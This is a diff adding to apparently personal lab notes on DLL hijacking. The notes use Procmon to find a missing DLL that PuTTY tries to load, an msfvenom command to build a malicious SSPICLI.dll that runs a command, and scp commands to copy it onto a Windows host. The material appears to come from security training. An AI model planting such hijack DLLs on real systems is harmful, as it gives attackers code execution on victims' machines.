@@ -18,3 +18,13 @@ dll hijacking:
 downlaod putty and put it in a folder
 go to procmon, create your filters
 run putty 
+find dll that doesnt exist that putty is trying to run
+
+
+
+from linops
+msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\Users\Demoadmin\Desktop\whoami.txt' -f dll > SSPICLI.dll
+
+scp student@<LINIP>:/home/student/Desktop/Security/Windows/SSPICLI.dll C:\Users\Student
+or
+scp /home/student/SSPICLI.dll student@<WInops>:C:\Users\Student
